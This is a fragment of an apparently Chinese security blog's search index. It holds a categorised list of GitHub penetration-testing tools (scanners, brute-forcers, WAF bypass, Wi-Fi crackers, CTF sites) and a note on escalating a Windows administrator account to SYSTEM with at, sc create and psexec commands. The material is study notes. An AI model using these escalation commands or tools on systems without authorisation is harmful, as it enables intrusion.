枚举用户登录信息）</p><p>中间件扫描、指纹识别类</p><p><a href="https://github.com/ring04h/wyportmap" target="_blank" rel="noopener">https://github.com/ring04h/wyportmap</a> (目标端口扫描+系统服务指纹识别)</p><p><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a> (动态多线程敏感信息泄露检测工具)</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a> (WAF产品指纹识别)</p><p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a> （ssl类型识别)</p><p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a> (web指纹识别)</p><p><a href="https://github.com/tanjiti/FingerPrint" target="_blank" rel="noopener">https://github.com/tanjiti/FingerPrint</a> (web应用指纹识别)</p><p><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a> （网络爬虫式指纹识别)</p><p><a href="https://github.com/OffensivePython/Nscan" target="_blank" rel="noopener">https://github.com/OffensivePython/Nscan</a> (a fast Network scanner inspired by Masscan and Zmap)</p><p><a href="https://github.com/ywolf/F-NAScan" target="_blank" rel="noopener">https://github.com/ywolf/F-NAScan</a> (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别）</p><p><a href="https://github.com/ywolf/F-MiddlewareScan" target="_blank" rel="noopener">https://github.com/ywolf/F-MiddlewareScan</a> （中间件扫描）</p><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> (Web path scanner)</p><p><a href="https://github.com/x0day/bannerscan" target="_blank" rel="noopener">https://github.com/x0day/bannerscan</a> （C段Banner与路径扫描）</p><p><a href="https://github.com/RASSec/RASscan" target="_blank" rel="noopener">https://github.com/RASSec/RASscan</a> (端口服务扫描)</p><p><a href="https://github.com/3xp10it/bypass_waf" target="_blank" rel="noopener">https://github.com/3xp10it/bypass_waf</a> （waf自动暴破）</p><p><a href="https://github.com/3xp10it/mytools/blob/master/xcdn.py（获取cdn背后的真实ip）" target="_blank" rel="noopener">https://github.com/3xp10it/mytools/blob/master/xcdn.py（获取cdn背后的真实ip）</a></p><p><a href="https://github.com/Xyntax/BingC（基于Bing搜索引擎的C段/旁站查询，多线程，支持API）" target="_blank" rel="noopener">https://github.com/Xyntax/BingC（基于Bing搜索引擎的C段/旁站查询，多线程，支持API）</a></p><p><a href="https://github.com/Xyntax/DirBrute（多线程WEB目录爆破工具）" target="_blank" rel="noopener">https://github.com/Xyntax/DirBrute（多线程WEB目录爆破工具）</a></p><p><a href="https://github.com/zer0h/httpscan（一个爬虫式的网段Web主机发现小工具）" target="_blank" rel="noopener">https://github.com/zer0h/httpscan（一个爬虫式的网段Web主机发现小工具）</a></p><p><a href="https://github.com/lietdai/doom（thorn上实现的分布式任务分发的ip端口漏洞扫描器）" target="_blank" rel="noopener">https://github.com/lietdai/doom（thorn上实现的分布式任务分发的ip端口漏洞扫描器）</a></p><p>专用扫描器</p><p><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> (Jenkins漏洞探测、用户抓取爆破)</p><p><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a> (discuz扫描)</p><p><a href="https://github.com/chuhades/CMS-Exploit-Framework" target="_blank" rel="noopener">https://github.com/chuhades/CMS-Exploit-Framework</a> (CMS攻击框架)</p><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a> (an IIS shortname Scanner)</p><p><a href="https://github.com/We5ter/Scanne" target="_blank" rel="noopener">https://github.com/We5ter/Scanne</a> … ter/FlashScanner.pl (flashxss扫描)</p><p><a href="https://github.com/coffeehb/SSTIF（一个Fuzzing服务器端模板注入漏洞的半自动化工具）" target="_blank" rel="noopener">https://github.com/coffeehb/SSTIF（一个Fuzzing服务器端模板注入漏洞的半自动化工具）</a></p><p>无线网络</p><p><a href="https://github.com/savio-code/fern-wifi-cracker/" target="_blank" rel="noopener">https://github.com/savio-code/fern-wifi-cracker/</a> (无线安全审计工具)</p><p><a href="https://github.com/m4n3dw0lf/PytheM（Python网络/渗透测试工具）" target="_blank" rel="noopener">https://github.com/m4n3dw0lf/PytheM（Python网络/渗透测试工具）</a></p><p><a href="https://github.com/P0cL4bs/WiFi-Pumpkin（无线安全渗透测试套件）" target="_blank" rel="noopener">https://github.com/P0cL4bs/WiFi-Pumpkin（无线安全渗透测试套件）</a></p><p>综合类</p><p><a href="https://github.com/az0ne/AZScanner" target="_blank" rel="noopener">https://github.com/az0ne/AZScanner</a> (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)</p><p><a href="https://github.com/blackye/lalascan" target="_blank" rel="noopener">https://github.com/blackye/lalascan</a> (自主开发的分布式web漏洞扫描框架，集合owasp top10漏洞扫描和边界资产发现能力)</p><p><a href="https://github.com/blackye/BkScanner" target="_blank" rel="noopener">https://github.com/blackye/BkScanner</a> (BkScanner 分布式、插件化web漏洞扫描器)</p><p><a href="https://github.com/ysrc/GourdScanV2" target="_blank" rel="noopener">https://github.com/ysrc/GourdScanV2</a> （被动式漏洞扫描)</p><p><a href="https://github.com/alpha1e0/pentestdb" target="_blank" rel="noopener">https://github.com/alpha1e0/pentestdb</a> (WEB渗透测试数据库)</p><p><a href="https://github.com/netxfly/passive_scan" target="_blank" rel="noopener">https://github.com/netxfly/passive_scan</a> (基于http代理的web漏洞扫描器)</p><p><a href="https://github.com/1N3/Sn1per" target="_blank" rel="noopener">https://github.com/1N3/Sn1per</a> (自动化扫描器，包括中间件扫描以及设备指纹识别)</p><p><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner" target="_blank" rel="noopener">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> （定向全自动化渗透测试工具）</p><p><a href="https://github.com/3xp10it/3xp10it" target="_blank" rel="noopener">https://github.com/3xp10it/3xp10it</a> （3xp10it自动化渗透测试框架）</p><p><a href="https://github.com/Lcys/lcyscan（python插件化漏洞扫描器）" target="_blank" rel="noopener">https://github.com/Lcys/lcyscan（python插件化漏洞扫描器）</a></p><p><a href="https://github.com/Xyntax/POC-T（渗透测试插件化并发框架）" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T（渗透测试插件化并发框架）</a></p><h3 id="CTF平台"><a href="#CTF平台" class="headerlink" title="CTF平台"></a>CTF平台</h3><p><a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">http://www.shiyanbar.com/</a></p><p><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">http://oj.xctf.org.cn/</a></p><p><a href="http://ctf.bugku.com/" target="_blank" rel="noopener">http://ctf.bugku.com/</a></p><p><a href="http://rookiehacker.org/" target="_blank" rel="noopener">http://rookiehacker.org/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>admin提权为system</title>
      <link href="/2019/04/12/admin-ti-quan-wei-system/"/>
      <url>/2019/04/12/admin-ti-quan-wei-system/</url>
      
        <content type="html"><![CDATA[<p><code>windows</code>底下设置密码</p><pre><code>net user username *</code></pre><p>提醒输入密码，确认密码</p><p><code>net user</code>查看当前系统下面的用户账号 <code>XP</code>底下是<code>HelpAssistant</code>是远程协助的账号</p><p><code>net user username</code>查看当前系统这个账号的基本信息</p><p>属于那个组，属于管理员组，具有百分之九十九的账号权限。</p><p>从管理员提权到<code>SYSTEM</code></p><p>使用<code>at</code>命令 指定一个时间使得在某一个时间执行一个特定的任务， <code>at 18:30 /interactive</code> <code>cmd</code>执行完成后就会获取一个<code>SYSTEM</code>的<code>CMD</code>的权限。 可以使用<code>whoami</code>命令查看一个是什么权限，但是whoami是旨在服务器端运行的程序<br>接下来使用<code>system</code>权限杀掉掉<code>explor</code>桌面进程，在打开是不是就整个桌面的环境都是<code>SYSTEM</code>权限</p><p><code>cmd</code>下输入<code>taskmgr</code>，进入任务管理器，结束进程 ，在新建一个任务就会打开<code>explor</code>进程。现在打开的全部都是<code>system</code>权限</p><p>注意：这种方式<code>windows xp</code>,<code>2003</code>使用，到了<code>windows 8</code> <code>windows7</code> <code>At</code>命令就被删除了。</p><p><code>windows7</code>使用<code>sc</code>命令</p><p>使用<code>sc</code>可以创建一条系统的服务</p><pre><code>sc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interact</code></pre><p><code>interact</code>是交互式的 <code>syscmd</code> 是自己取的名字，<code>cmd /K start</code>是使用的重新打开一个<code>cmd</code>命令窗口。</p><p><code>services.msc</code>打开系统的服务</p><p><code>cmd</code>输入 <code>sc syscmd start</code>启动了<code>system</code>权限的<code>cmd</code>窗口 - 使用第三方的套件 下载之后，<code>psexec</code>提权</p><p><code>- -I</code> 交互式运行程序<br><code>-s</code> 把自己提升为一个<code>system</code>权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
